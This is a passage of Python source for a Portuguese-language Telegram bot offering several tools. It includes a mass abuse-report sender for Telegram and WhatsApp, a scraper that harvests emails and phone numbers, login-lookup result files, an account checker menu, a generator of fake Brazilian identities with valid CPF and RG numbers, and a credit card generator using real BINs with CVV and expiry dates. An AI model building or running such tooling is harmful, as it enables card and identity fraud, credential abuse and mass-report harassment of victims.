        await event.answer("APENAS O USUÁRIO QUE PEDIU O COMANDO PODE USAR ESSES BOTÕES.", alert=True)
        return

    hash_nome = str(id_user_btn)

    if acao == "cancelarbusca":
        if hash_nome in tasks_canceladas:
            tasks_canceladas[hash_nome]['cancelled'] = True
        await event.answer("SUA BUSCA FOI CANCELADA COM SUCESSO!", alert=True)
        await event.delete()

    elif acao == "apagarmensagem":
        await event.delete()

    elif acao == "cancel":
        await event.delete()

    elif acao == "stop_reports":
        global report_data
        if report_data["running"] and report_data["user_id"] == id_user_btn:
            report_data["running"] = False
            elapsed_time = (datetime.now() - report_data["start_time"]).total_seconds()
            await event.edit(
                f"**⏹ | REPORTS PARADOS PELO USUÁRIO**\n"
                f"📊 Estatísticas finais:\n"
                f"• Total enviados: {report_data['counter']}/{report_data['quantity']}\n"
                f"• Tempo total: {int(elapsed_time)} segundos"
            )
            # Reset report data
            report_data = {
                "text": "",
                "link": "",
                "quantity": 0,
                "running": False,
                "counter": 0,
                "start_time": None,
                "user_id": None
            }
        await event.answer("Reports parados com sucesso!", alert=True)

    elif acao == "stop_whatsapp_reports":
        whatsapp_report_data["running"] = False
        await event.answer("⏹ Reports WhatsApp interrompidos!")
        await event.edit("**⏹ | REPORTS WHATSAPP INTERROMPIDOS PELO USUÁRIO**")

    # Report2 handlers - Funcionalidade indisponível para bots
    elif acao.startswith("report2_") and not acao.startswith("report2_target_") and not acao.startswith("report2_reason_") and acao != "report2_menu":
        await safe_edit_message(event,
            "❌ **REPORT2 INDISPONÍVEL**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚠️ **Limitação Técnica:**\n"
            "O sistema de reports avançados não funciona com bots.\n\n"
            "💡 **Use as alternativas disponíveis:**\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("📝 Usar /report", data=f"cmd_report:{id_user_btn}"),
                 Button.inline("📱 Usar /reportwpp", data=f"cmd_reportwpp:{id_user_btn}")],
                [Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]
            ]
        )

    elif acao.startswith("report2_target_") or acao == "report2_menu":
        await safe_edit_message(event,
            "❌ **REPORT2 INDISPONÍVEL**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚠️ **Esta funcionalidade requer conta de usuário.**\n\n"
            "💡 **Use as alternativas:**\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("📝 Usar /report", data=f"cmd_report:{id_user_btn}"),
                 Button.inline("📱 Usar /reportwpp", data=f"cmd_reportwpp:{id_user_btn}")],
                [Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]
            ]
        )

    elif acao == "stop_report2" or acao.startswith("report2_reason_") or acao.startswith("start_report2_"):
        await event.answer("❌ Report2 não disponível para bots", alert=True)
        await safe_edit_message(event,
            "❌ **REPORT2 INDISPONÍVEL**\n\n"
            "⚠️ Esta funcionalidade requer conta de usuário.\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🗑️ Fechar", data=f"apagarmensagem:{id_user_btn}")]]
        )

    elif acao.startswith("scrape_"):
        try:
            scrape_type = acao
            # URL já foi extraída no início da função
            if 'url' not in locals() or not url:
                await event.answer("❌ URL não encontrada!", alert=True)
                return

            await safe_edit_message(event,
                f"🕷️ **INICIANDO WEB SCRAPER...**\n\n"
                f"🌐 **URL:** `{url}`\n"
                f"⏳ **STATUS:** Conectando ao site...\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            , buttons=[])

            # Configurar o que extrair
            extract_emails = scrape_type in ["scrape_emails", "scrape_all"]
            extract_phones = scrape_type in ["scrape_phones", "scrape_all"] 
            extract_links = scrape_type in ["scrape_links", "scrape_all"]

            # Status update
            await safe_edit_message(event,
                f"🕷️ **WEB SCRAPER ATIVO**\n\n"
                f"🌐 **URL:** `{url}`\n"
                f"⏳ **STATUS:** Extraindo dados...\n"
                f"📊 **BUSCANDO:** {'📧 Emails ' if extract_emails else ''}{'📞 Telefones ' if extract_phones else ''}{'🔗 Links' if extract_links else ''}\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━"
            , buttons=[])

            # Executar scraping
            scraper = WebScraper(url, extract_emails, extract_phones, extract_links)
            results = await asyncio.to_thread(scraper.scrape)

            if "error" in results:
                await safe_edit_message(event,
                    f"❌ **ERRO NO WEB SCRAPER**\n\n"
                    f"🌐 URL: `{url}`\n"
                    f"⚠️ Erro: `{results['error']}`\n\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    "💡 Verifique se a URL está correta e acessível."
                , buttons=[])
                return

            # Formatar resultados
            message = f"✅ **WEB SCRAPER CONCLUÍDO**\n\n"
            message += f"🌐 **URL:** `{url}`\n\n"
            message += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

            if extract_emails and results["emails"]:
                message += f"📧 **EMAILS ENCONTRADOS ({len(results['emails'])}):**\n"
                for email in list(results["emails"])[:10]:  # Mostrar apenas os primeiros 10
                    message += f"• `{email}`\n"
                if len(results["emails"]) > 10:
                    message += f"• ... e mais {len(results['emails']) - 10} emails\n"
                message += "\n"

            if extract_phones and results["phones"]:
                message += f"📞 **TELEFONES ENCONTRADOS ({len(results['phones'])}):**\n"
                for phone in list(results["phones"])[:10]:  # Mostrar apenas os primeiros 10
                    message += f"• `{phone}`\n"
                if len(results["phones"]) > 10:
                    message += f"• ... e mais {len(results['phones']) - 10} telefones\n"
                message += "\n"

            if extract_links and results["links"]:
                message += f"🔗 **LINKS ENCONTRADOS ({len(results['links'])}):**\n"
                for link in list(results["links"])[:5]:  # Mostrar apenas os primeiros 5
                    message += f"• `{link}`\n"
                if len(results["links"]) > 5:
                    message += f"• ... e mais {len(results['links']) - 5} links\n"
                message += "\n"

            if not any([results["emails"], results["phones"], results["links"]]):
                message += "❌ **Nenhum dado encontrado no site.**\n\n"

            message += "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            message += "🤖 @CatalystServerRobot"

            # Criar arquivo com todos os resultados se houver muitos dados
            total_items = len(results["emails"]) + len(results["phones"]) + len(results["links"])
            if total_items > 20:
                file_content = f"=== WEB SCRAPER RESULTADOS ===\nURL: {url}\n\n"

                if results["emails"]:
                    file_content += f"EMAILS ({len(results['emails'])}):\n"
                    file_content += "\n".join(results["emails"]) + "\n\n"

                if results["phones"]:
                    file_content += f"TELEFONES ({len(results['phones'])}):\n"
                    file_content += "\n".join(results["phones"]) + "\n\n"

                if results["links"]:
                    file_content += f"LINKS ({len(results['links'])}):\n"
                    file_content += "\n".join(results["links"]) + "\n\n"

                # Salvar arquivo temporário
                filename = f"temp/webscraper_{id_user_btn}.txt"
                os.makedirs("temp", exist_ok=True)
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(file_content)

                await safe_edit_message(event, message, buttons=[])
                await bot.send_file(
                    event.chat_id, 
                    file=filename,
                    caption=f"📄 **Arquivo completo com todos os resultados**\n\n🤖 @CatalystServerRobot",
                    buttons=[[Button.inline("🗑️ Apagar", data=f"apagarmensagem:{id_user_btn}")]]
                )

                # Limpar arquivo temporário
                try:
                    os.remove(filename)
                except:
                    pass
            else:
                await safe_edit_message(event, message, buttons=[[Button.inline("🗑️ Apagar", data=f"apagarmensagem:{id_user_btn}")]])

        except Exception as e:
            await safe_edit_message(event,
                f"❌ **ERRO NO WEB SCRAPER**\n\n"
                f"⚠️ Erro: `{str(e)}`\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "💡 Tente novamente ou verifique a URL."
            , buttons=[])

    elif acao in ["format1", "format2"]:
        pasta = f"temp/{id_user_btn}/"
        nome = f"{id_user_btn}.txt" if acao == "format1" else f"{id_user_btn}_formatado.txt"
        caminho = os.path.join(pasta, nome)

        if not os.path.exists(caminho):
            await event.answer("O ARQUIVO NÃO FOI ENCONTRADO! TENTE NOVAMENTE.", alert=True)
            return

        await event.delete()
        await asyncio.sleep(0.5)

        sender = await bot.get_entity(id_user_btn)
        mention = f"[{sender.first_name}](tg://user?id={id_user_btn})"

        with open(caminho, "r", encoding="utf-8") as f:
            qtd = sum(1 for _ in f)

        caption = f"""**☁️ | RESULTADO ENVIADO - TXT**

**• QUANTIDADE:** `{qtd}`
**• URL FORNECIDA:** {urls_busca.get(id_user_btn, "desconhecida")}
**• QUEM PEDIU:** {mention}

🤖 @CatalystServerRobot"""

        await bot.send_file(
            event.chat_id,
            file=caminho,
            caption=caption,
            buttons=[[Button.inline("❌ | APAGAR MENSAGEM", data=f"deletefile:{id_user_btn}")]],
            reply_to=mensagens_origem.get(id_user_btn)
        )

        # Notificação para admin
        if meu_id:
            try:
                await bot.send_message(meu_id, f"""**⚠️ | NOVA CONSULTA DE LOGIN**

**• QUEM FOI:** {mention}
**• URL:** {urls_busca.get(id_user_btn, "desconhecida")}
**• QUANTIDADE:** {qtd}

🤖 @CatalystServerRobot""")
            except:
                pass

        shutil.rmtree(pasta, ignore_errors=True)



    elif acao == "sites_checker":
        try:
            await safe_edit_message(event,
                f"🌐 **SITES CHECKER v3.0**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🔍 **VERIFICAÇÃO RÁPIDA DE SITES:**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🤖 @CatalystServerRobot",
                buttons=[
                    [Button.inline("🔍 Sites Populares", data=f"check_popular:{id_user_btn}"),
                     Button.inline("🌐 Site Customizado", data=f"check_custom:{id_user_btn}")],
                    [Button.inline("🔙 Voltar ao Checker", data=f"checker_menu:{id_user_btn}")]
                ]
            )
        except Exception as e:
            print(f"❌ Erro ao editar mensagem sites_checker: {e}")
            await event.answer("Erro ao carregar menu.", alert=True)

    elif acao == "check_popular":
        popular_sites = [
            "https://google.com",
            "https://facebook.com", 
            "https://youtube.com",
            "https://twitter.com",
            "https://instagram.com"
        ]

        await safe_edit_message(event, "🔍 **Verificando sites populares...**", buttons=[])

        results = []
        for site in popular_sites:
            status_info = check_site_status(site)
            site_name = site.replace("https://", "").replace("www.", "")
            if status_info["response_time"]:
                results.append(f"• {site_name}: {status_info['status']} ({status_info['response_time']}ms)")
            else:
                results.append(f"• {site_name}: {status_info['status']}")

        await safe_edit_message(event,
            f"🌐 **RESULTADO - SITES POPULARES**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
            "\n".join(results) + "\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[[Button.inline("🔙 Voltar", data=f"sites_checker:{id_user_btn}")]]
        )

    elif acao == "check_custom":
        # Criar estado para aguardar URL
        globals()[f'sites_state_{id_user_btn}'] = {'waiting_url': True}

        await safe_edit_message(event,
            f"🌐 **VERIFICAR SITE CUSTOMIZADO**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 **Digite a URL do site:**\n\n"
            "💡 **Exemplos:**\n"
            "• `https://exemplo.com`\n"
            "• `exemplo.com`\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚡ Aguardando URL...",
            buttons=[[Button.inline("🔙 Voltar", data=f"sites_checker:{id_user_btn}")]]
        )
    elif acao == "checker_menu":
        await safe_edit_message(event,
            f"🔍 **CATALYST CHECKER v3.0**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🛠️ **FUNCIONALIDADES DISPONÍVEIS:**\n\n"
            "🌐 **SITES UPANDO**\n"
            "👤 **GERADOR DE PESSOA FAKE v2.0**\n"
            "🔐 **ACCOUNT CHECKER**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("🌐 Sites Checker", data=f"sites_checker:{id_user_btn}"),
                 Button.inline("👤 Fake Person v2.0", data=f"fake_person:{id_user_btn}")],
                [Button.inline("🔐 Account Checker", data=f"account_checker:{id_user_btn}")],
                [Button.inline("🗑️ Cancelar", data=f"apagarmensagem:{id_user_btn}")]
            ]
        )

    elif acao == "copy_person":
        try:
            person_data = generate_fake_person_advanced()

            # Criar texto formatado para cópia
            copy_text = f"""📋 DADOS DA PESSOA FAKE BRASILEIRA v3.0

👤 Nome: {person_data['nome']}
🚹 Gênero: {person_data['genero']}
🎂 Data de Nascimento: {person_data['data_nascimento']}
👤 Idade: {person_data['idade']} anos
🆔 CPF: {person_data['cpf']}
📄 RG: {person_data['rg']}

🏥 CARACTERÍSTICAS FÍSICAS:
⚖️ Peso: {person_data['peso']}
📏 Altura: {person_data['altura']}
🩸 Tipo Sanguíneo: {person_data['tipo_sanguineo']}
👁️ Cor dos Olhos: {person_data['cor_olhos']}
💇 Cor do Cabelo: {person_data['cor_cabelo']}

📞 CONTATO:
📱 Telefone: {person_data['telefone']}
📧 Email: {person_data['email']}

🏠 ENDEREÇO:
🏘️ Endereço: {person_data['endereco']}
🌆 Cidade: {person_data['cidade']}
🌎 Estado: {person_data['estado']}
📮 CEP: {person_data['cep']}

💼 DADOS PROFISSIONAIS:
👔 Profissão: {person_data['profissao']}
🏢 Setor: {person_data['setor']}
🎓 Escolaridade: {person_data['escolaridade']}
💰 Salário: {person_data['salario']}

🇧🇷 Nacionalidade: {person_data['nacionalidade']}

🎯 Sistema v3.0 com dados físicos e profissionais
✅ Baseado em dados reais brasileiros
⚠️ Dados fictícios para teste
🤖 @CatalystServerRobot"""

            await bot.send_message(
                event.chat_id,
                copy_text,
                buttons=[[Button.inline("🗑️ Apagar", data=f"apagarmensagem:{id_user_btn}")]]
            )

            await event.answer("📋 Dados copiados como nova mensagem!", alert=True)
        except Exception as e:
            await event.answer(f"❌ Erro ao copiar dados: {str(e)[:50]}", alert=True)

    elif acao == "person_stats":
        try:
            db_pessoas = sqlite3.connect("database/pessoas.db")
            cursor_pessoas = db_pessoas.cursor()

            # Contar estatísticas do banco
            cursor_pessoas.execute("SELECT COUNT(*) FROM nomes_masculinos")
            count_m = cursor_pessoas.fetchone()[0]

            cursor_pessoas.execute("SELECT COUNT(*) FROM nomes_femininos")
            count_f = cursor_pessoas.fetchone()[0]

            cursor_pessoas.execute("SELECT COUNT(*) FROM sobrenomes")
            count_s = cursor_pessoas.fetchone()[0]

            cursor_pessoas.execute("SELECT COUNT(*) FROM enderecos")
            count_e = cursor_pessoas.fetchone()[0]

            db_pessoas.close()

            # Calcular combinações possíveis
            combinacoes_totais = (count_m + count_f) * count_s * count_e * 365 * 62  # 62 anos de idade possível

            await safe_edit_message(event,
                f"📊 **ESTATÍSTICAS DO GERADOR v2.0**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📝 **NOMES MASCULINOS:** `{count_m:,}`\n"
                f"🌸 **NOMES FEMININOS:** `{count_f:,}`\n"
                f"👨‍👩‍👧‍👦 **SOBRENOMES:** `{count_s:,}`\n"
                f"🏠 **ENDEREÇOS REAIS:** `{count_e:,}`\n\n"
                f"🎯 **COMBINAÇÕES POSSÍVEIS:**\n"
                f"`{combinacoes_totais:,}` pessoas únicas\n\n"
                "✅ **RECURSOS:**\n"
                "• CPFs válidos algoritmicamente\n"
                "• RGs válidos por estado\n"
                "• Telefones com DDDs reais\n"
                "• Emails com domínios brasileiros\n"
                "• Endereços de cidades reais\n"
                "• CEPs baseados em localização\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🤖 @CatalystServerRobot",
                buttons=[[Button.inline("🔙 Voltar", data=f"fake_person:{id_user_btn}")]]
            )
        except Exception as e:
            await event.answer(f"❌ Erro ao buscar estatísticas: {str(e)}", alert=True)

    elif acao == "generate_multiple":
        try:
            await safe_edit_message(event, "🎲 **Gerando 5 pessoas...**", buttons=[])

            pessoas = []
            for i in range(5):
                try:
                    person_data = generate_fake_person_advanced()
                    pessoas.append(f"**PESSOA {i+1}:**\n👤 {person_data['nome']}\n🆔 {person_data['cpf']}\n📞 {person_data['telefone']}\n📧 {person_data['email']}")
                except Exception as e:
                    print(f"❌ Erro ao gerar pessoa {i+1}: {e}")
                    pessoas.append(f"**PESSOA {i+1}:** ❌ Erro na geração")

            resultado = f"🎲 **5 PESSOAS GERADAS**\n\n" + "\n\n".join(pessoas)
            resultado += f"\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n🤖 @CatalystServerRobot"

            await safe_edit_message(event,
                resultado,
                buttons=[
                    [Button.inline("🔄 Gerar Mais 5", data=f"generate_multiple:{id_user_btn}")],
                    [Button.inline("🔙 Voltar", data=f"fake_person:{id_user_btn}")]
                ]
            )
        except Exception as e:
            await safe_edit_message(event,
                f"❌ **ERRO AO GERAR MÚLTIPLAS PESSOAS**\n\n{str(e)[:100]}",
                buttons=[[Button.inline("🔙 Voltar", data=f"fake_person:{id_user_btn}")]]
            )

    elif acao == "cartoes_credito":
        await safe_edit_message(event,
            f"💳 **GERADOR DE CARTÕES v4.0**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🎯 **BANDEIRAS DISPONÍVEIS:**\n"
            "• Visa (16 dígitos)\n"
            "• Mastercard (16 dígitos)\n"
            "• Elo (16 dígitos)\n"
            "• Hipercard (16 dígitos)\n"
            "• American Express (15 dígitos)\n\n"
            "✅ **Recursos:**\n"
            "• Algoritmo de Luhn válido\n"
            "• BINs reais das bandeiras\n"
            "• CVV e data de validade\n"
            "• Formatação automática\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("🎲 Cartão Aleatório", data=f"gerar_cartao_random:{id_user_btn}"),
                 Button.inline("💳 Escolher Bandeira", data=f"escolher_bandeira:{id_user_btn}")],
                [Button.inline("📊 5 Cartões", data=f"gerar_5_cartoes:{id_user_btn}"),
                 Button.inline("✅ Validar Cartão", data=f"validar_cartao:{id_user_btn}")],
                [Button.inline("🔙 Voltar", data=f"geradores_menu:{id_user_btn}")]
            ]
        )

    elif acao == "empresas_fake":
        await safe_edit_message(event,
            f"🏢 **GERADOR DE EMPRESAS v4.0**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🎯 **DADOS GERADOS:**\n"
            "• Razão Social realista\n"
            "• CNPJ válido matematicamente\n"
            "• Inscrição Estadual\n"
            "• Data de abertura\n"
            "• Capital social\n"
            "• Atividade principal (CNAE)\n"
            "• Situação da empresa\n\n"
            "✅ **Algoritmo da Receita Federal**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("🏢 Gerar Empresa", data=f"gerar_empresa:{id_user_btn}"),
                 Button.inline("📋 Copiar Empresa", data=f"copiar_empresa:{id_user_btn}")],
                [Button.inline("📊 5 Empresas", data=f"gerar_5_empresas:{id_user_btn}")],
                [Button.inline("🔙 Voltar", data=f"geradores_menu:{id_user_btn}")]
            ]
        )

    elif acao == "validadores":
        await safe_edit_message(event,
            f"✅ **VALIDADORES v4.0**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🛠️ **FERRAMENTAS DISPONÍVEIS:**\n\n"
            "🆔 **VALIDADOR DE CPF**\n"
            "   • Algoritmo da Receita Federal\n"
            "   • Verificação de dígitos\n\n"
            "🏢 **VALIDADOR DE CNPJ**\n"
            "   • Algoritmo oficial\n"
            "   • Validação completa\n\n"
            "💳 **VALIDADOR DE CARTÃO**\n"
            "   • Algoritmo de Luhn\n"
            "   • Todas as bandeiras\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("🆔 Validar CPF", data=f"validar_cpf:{id_user_btn}"),
                 Button.inline("🏢 Validar CNPJ", data=f"validar_cnpj:{id_user_btn}")],
                [Button.inline("💳 Validar Cartão", data=f"validar_cartao_input:{id_user_btn}")],
                [Button.inline("🔙 Voltar", data=f"geradores_menu:{id_user_btn}")]
            ]
        )

    elif acao == "fake_person":
        try:
            person_data = generate_fake_person_advanced()

            await safe_edit_message(event,
                f"👤 **PESSOA FAKE BRASILEIRA v3.0**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📝 **Nome:** {person_data['nome']}\n"
                f"🚹 **Gênero:** {person_data['genero']}\n"
                f"🎂 **Data de Nascimento:** {person_data['data_nascimento']}\n"
                f"👤 **Idade:** {person_data['idade']} anos\n"
                f"🆔 **CPF:** `{person_data['cpf']}`\n"
                f"📄 **RG:** `{person_data['rg']}`\n\n"
                "🏥 **CARACTERÍSTICAS FÍSICAS:**\n"
                f"⚖️ **Peso:** {person_data['peso']}\n"
                f"📏 **Altura:** {person_data['altura']}\n"
                f"🩸 **Tipo Sanguíneo:** {person_data['tipo_sanguineo']}\n"
                f"👁️ **Cor dos Olhos:** {person_data['cor_olhos']}\n"
                f"💇 **Cor do Cabelo:** {person_data['cor_cabelo']}\n\n"
                "📞 **CONTATO:**\n"
                f"📱 **Telefone:** `{person_data['telefone']}`\n"
                f"📧 **Email:** `{person_data['email']}`\n\n"
                "🏠 **ENDEREÇO:**\n"
                f"🏘️ **Endereço:** {person_data['endereco']}\n"
                f"🌆 **Cidade:** {person_data['cidade']}\n"
                f"🌎 **Estado:** {person_data['estado']}\n"
                f"📮 **CEP:** `{person_data['cep']}`\n\n"
                "💼 **DADOS PROFISSIONAIS:**\n"
                f"👔 **Profissão:** {person_data['profissao']}\n"
                f"🏢 **Setor:** {person_data['setor']}\n"
                f"🎓 **Escolaridade:** {person_data['escolaridade']}\n"
                f"💰 **Salário:** {person_data['salario']}\n\n"
                f"🇧🇷 **Nacionalidade:** {person_data['nacionalidade']}\n\n"
                "✅ **Sistema v3.0 com dados físicos e profissionais**\n"
                "📊 **Baseado em dados reais brasileiros**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🤖 @CatalystServerRobot",
                buttons=[
                    [Button.inline("🔄 Gerar Nova Pessoa", data=f"fake_person:{id_user_btn}"),
                     Button.inline("📋 Copiar Dados", data=f"copy_person:{id_user_btn}")],
                    [Button.inline("📊 Estatísticas", data=f"person_stats:{id_user_btn}"),
                     Button.inline("🎲 Gerar 5 Pessoas", data=f"generate_multiple:{id_user_btn}")],
                    [Button.inline("🔙 Voltar", data=f"geradores_menu:{id_user_btn}")]
                ]
            )
        except Exception as e:
            await safe_edit_message(event,
                f"❌ **ERRO AO GERAR PESSOA**\n\n{str(e)[:100]}",
                buttons=[[Button.inline("🔙 Voltar", data=f"geradores_menu:{id_user_btn}")]]
            )

    elif acao == "geradores_menu":
        await safe_edit_message(event,
            f"🎲 **CATALYST GERADORES v4.0**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🛠️ **FERRAMENTAS DE GERAÇÃO:**\n\n"
            "👤 **GERADOR DE PESSOA FAKE v2.0**\n"
            "💳 **GERADOR DE CARTÕES DE CRÉDITO**\n"
            "🏢 **GERADOR DE EMPRESAS FAKE**\n"
            "✅ **VALIDADORES CPF/CNPJ**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("👤 Pessoa Fake v2.0", data=f"fake_person:{id_user_btn}"),
                 Button.inline("💳 Cartões de Crédito", data=f"cartoes_credito:{id_user_btn}")],
                [Button.inline("🏢 Empresas Fake", data=f"empresas_fake:{id_user_btn}"),
                 Button.inline("✅ Validadores", data=f"validadores:{id_user_btn}")],
                [Button.inline("🗑️ Cancelar", data=f"apagarmensagem:{id_user_btn}")]
            ]
        )

    elif acao == "escolher_bandeira":
        await safe_edit_message(event,
            f"💳 **ESCOLHER BANDEIRA**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🎯 **Selecione a bandeira desejada:**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "🤖 @CatalystServerRobot",
            buttons=[
                [Button.inline("💳 Visa", data=f"gerar_cartao_visa:{id_user_btn}"),
                 Button.inline("💳 Mastercard", data=f"gerar_cartao_mastercard:{id_user_btn}")],
                [Button.inline("💳 Elo", data=f"gerar_cartao_elo:{id_user_btn}"),
                 Button.inline("💳 Hipercard", data=f"gerar_cartao_hipercard:{id_user_btn}")],
                [Button.inline("💳 American Express", data=f"gerar_cartao_amex:{id_user_btn}")],
                [Button.inline("🔙 Voltar", data=f"cartoes_credito:{id_user_btn}")]
            ]
        )

    elif acao.startswith("gerar_cartao_") and acao != "gerar_cartao_random":
        try:
            # Extrair bandeira do nome da ação
            bandeira_map = {
                "gerar_cartao_visa": "Visa",
                "gerar_cartao_mastercard": "Mastercard",
                "gerar_cartao_elo": "Elo",
                "gerar_cartao_hipercard": "Hipercard",
                "gerar_cartao_amex": "American Express"
            }
            
            bandeira = bandeira_map.get(acao, "Visa")
            cartao = DataGenerator.gerar_cartao(bandeira)

            await safe_edit_message(event,
                f"💳 **CARTÃO GERADO - {cartao['bandeira'].upper()}**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🔢 **Número:** `{cartao['numero']}`\n"
                f"🛡️ **CVV:** `{cartao['cvv']}`\n"
                f"📅 **Validade:** `{cartao['validade']}`\n"
                f"🏦 **Bandeira:** `{cartao['bandeira']}`\n\n"
                "✅ **Válido pelo algoritmo de Luhn**\n"
                "⚠️ **Apenas para fins educacionais**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🤖 @CatalystServerRobot",
                buttons=[
                    [Button.inline(f"🔄 Outro {bandeira}", data=f"{acao}:{id_user_btn}")],
                    [Button.inline("🔙 Voltar", data=f"cartoes_credito:{id_user_btn}")]
                ]
            )
        except Exception as e:
            await event.answer(f"❌ Erro ao gerar cartão: {str(e)}", alert=True)

    elif acao == "gerar_cartao_random":
        try:
            cartao = DataGenerator.gerar_cartao()

            await safe_edit_message(event,
                f"💳 **CARTÃO GERADO - {cartao['bandeira'].upper()}**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🔢 **Número:** `{cartao['numero']}`\n"
                f"🛡️ **CVV:** `{cartao['cvv']}`\n"
                f"📅 **Validade:** `{cartao['validade']}`\n"
                f"🏦 **Bandeira:** `{cartao['bandeira']}`\n\n"
                "✅ **Válido pelo algoritmo de Luhn**\n"
                "⚠️ **Apenas para fins educacionais**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🤖 @CatalystServerRobot",
                buttons=[
                    [Button.inline("🔄 Outro Aleatório", data=f"gerar_cartao_random:{id_user_btn}")],
                    [Button.inline("🔙 Voltar", data=f"cartoes_credito:{id_user_btn}")]
                ]
            )
        except Exception as e:
            await event.answer(f"❌ Erro ao gerar cartão: {str(e)}", alert=True)

    elif acao == "gerar_empresa":
        try:
            empresa = DataGenerator.gerar_empresa_fake()

            await safe_edit_message(event,
                f"🏢 **EMPRESA GERADA**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🏢 **Razão Social:** {empresa['razao_social']}\n"
                f"📝 **Nome Fantasia:** {empresa['nome_fantasia']}\n"
                f"🆔 **CNPJ:** `{empresa['cnpj']}`\n"
                f"📋 **Inscrição Estadual:** `{empresa['inscricao_estadual']}`\n"
                f"📊 **Situação:** {empresa['situacao']}\n"
                f"📅 **Data de Abertura:** {empresa['data_abertura']}\n"
                f"💰 **Capital Social:** {empresa['capital_social']}\n"
                f"🎯 **Atividade Principal:** {empresa['atividade_principal']}\n"
                f"📏 **Porte:** {empresa['porte']}\n\n"
                "✅ **CNPJ válido matematicamente**\n"
                "⚠️ **Dados fictícios para teste**\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🤖 @CatalystServerRobot",
                buttons=[
                    [Button.inline("🔄 Outra Empresa", data=f"gerar_empresa:{id_user_btn}")],
                    [Button.inline("🔙 Voltar", data=f"empresas_fake:{id_user_btn}")]
                ]
            )
        except Exception as e:
            await event.answer(f"❌ Erro ao gerar empresa: {str(e)}", alert=True)

    elif acao == "start_support":
        # Simulação de início de suporte
        await event.answer("💬 Iniciando chat de suporte...", alert=True)

    elif acao == "support_faq":
        # Simulação de FAQ
        await event.answer("📋 FAQ em breve...", alert=True)

    elif acao == "report_bug":
        # Simulação de reporte de bug
        await event.answer("🐛 Reporte de bug em breve...", alert=True)

    elif acao == "validar_cpf":
        globals()[f'validar_cpf_state_{id_user_btn}'] = {'waiting': True}

        await safe_edit_message(event,
            f"🆔 **VALIDADOR DE CPF**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 **Digite o CPF para validar:**\n\n"
            "💡 **Formatos aceitos:**\n"
            "• `123.456.789-01`\n"
            "• `12345678901`\n\n"
            "🔍 **Será verificado:**\n"
            "• Formato correto\n"
            "• Dígitos verificadores\n"
            "• Algoritmo da Receita Federal\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⌨️ Digite o CPF no chat:",
            buttons=[[Button.inline("🔙 Voltar", data=f"validadores:{id_user_btn}")]]
        )

    elif acao == "validar_cnpj":
        globals()[f'validar_cnpj_state_{id_user_btn}'] = {'waiting': True}

        await safe_edit_message(event,
            f"🏢 **VALIDADOR DE CNPJ**\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 **Digite o CNPJ para validar:**\n\n"
            "💡 **Formatos aceitos:**\n"
            "• `12.345.678/0001-90`\n"
            "• `12345678000190`\n\n"
